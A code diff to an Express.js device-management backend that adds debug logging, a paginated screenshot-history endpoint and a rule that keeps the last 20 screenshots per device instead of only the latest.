@@ -908,24 +908,36 @@ router.post('/:deviceId/sms/sync', protect, async (req, res) => {
 router.get('/:deviceId/screenshot', protect, async (req, res) => {
   try {
     const deviceIdParam = req.params.deviceId;
+    console.log(`[Screenshot] Getting latest screenshot for: ${deviceIdParam}`);
 
-    // Find device
-    let device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
+    // Find device - try MongoDB _id first, then deviceId
+    let device = null;
+    const mongoose = require('mongoose');
+    
+    if (mongoose.Types.ObjectId.isValid(deviceIdParam)) {
+      device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
+    }
     if (!device) {
       device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
     }
 
     if (!device) {
+      console.log(`[Screenshot] Device not found: ${deviceIdParam}`);
       return res.status(404).json({ error: 'Device not found' });
     }
+
+    console.log(`[Screenshot] Found device: ${device.name}, deviceId: ${device.deviceId}`);
 
     // Get latest screenshot
     const screenshot = await Screenshot.findOne({ deviceId: device.deviceId })
       .sort({ capturedAt: -1 });
 
     if (!screenshot) {
+      console.log(`[Screenshot] No screenshot found for device: ${device.deviceId}`);
       return res.status(404).json({ error: 'No screenshot available', hint: 'Request a screenshot first' });
     }
+
+    console.log(`[Screenshot] Found screenshot: ${screenshot._id}, captured at: ${screenshot.capturedAt}`);
 
     res.json({
       success: true,
@@ -940,6 +952,58 @@ router.get('/:deviceId/screenshot', protect, async (req, res) => {
   } catch (error) {
     console.error('Failed to get screenshot:', error);
     res.status(500).json({ error: 'Failed to get screenshot' });
+  }
+});
+
+// Get all screenshots for a device (history)
+router.get('/:deviceId/screenshots', protect, async (req, res) => {
+  try {
+    const deviceIdParam = req.params.deviceId;
+    const limit = parseInt(req.query.limit) || 20;
+    const page = parseInt(req.query.page) || 1;
+    
+    console.log(`[Screenshots] Getting screenshot history for: ${deviceIdParam}`);
+
+    // Find device
+    let device = null;
+    const mongoose = require('mongoose');
+    
+    if (mongoose.Types.ObjectId.isValid(deviceIdParam)) {
+      device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
+    }
+    if (!device) {
+      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
+    }
+
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    // Get screenshots with pagination
+    const skip = (page - 1) * limit;
+    const screenshots = await Screenshot.find({ deviceId: device.deviceId })
+      .sort({ capturedAt: -1 })
+      .skip(skip)
+      .limit(limit);
+
+    const total = await Screenshot.countDocuments({ deviceId: device.deviceId });
+
+    res.json({
+      success: true,
+      screenshots: screenshots.map(s => ({
+        id: s._id.toString(),
+        imageData: s.imageData,
+        width: s.width,
+        height: s.height,
+        capturedAt: s.capturedAt
+      })),
+      total,
+      page,
+      pages: Math.ceil(total / limit)
+    });
+  } catch (error) {
+    console.error('Failed to get screenshots:', error);
+    res.status(500).json({ error: 'Failed to get screenshots' });
   }
 });
 
@@ -994,6 +1058,8 @@ router.post('/:deviceId/screenshot/upload', async (req, res) => {
     const deviceIdParam = req.params.deviceId;
     const { imageData, width, height } = req.body;
 
+    console.log(`[Screenshot Upload] Received from device: ${deviceIdParam}`);
+
     if (!imageData) {
       return res.status(400).json({ error: 'Image data is required' });
     }
@@ -1001,11 +1067,21 @@ router.post('/:deviceId/screenshot/upload', async (req, res) => {
     // Find device by deviceId
     const device = await Device.findOne({ deviceId: deviceIdParam });
     if (!device) {
+      console.log(`[Screenshot Upload] Device not found: ${deviceIdParam}`);
       return res.status(404).json({ error: 'Device not found' });
     }
 
-    // Delete old screenshots for this device (keep only latest)
-    await Screenshot.deleteMany({ deviceId: device.deviceId });
+    // Keep last 20 screenshots (delete older ones)
+    const screenshotCount = await Screenshot.countDocuments({ deviceId: device.deviceId });
+    if (screenshotCount >= 20) {
+      // Delete oldest screenshots to keep only 19 (new one will make 20)
+      const oldScreenshots = await Screenshot.find({ deviceId: device.deviceId })
+        .sort({ capturedAt: 1 })
+        .limit(screenshotCount - 19);
+      for (const old of oldScreenshots) {
+        await Screenshot.deleteOne({ _id: old._id });
+      }
+    }
 
     // Save new screenshot
     const screenshot = new Screenshot({
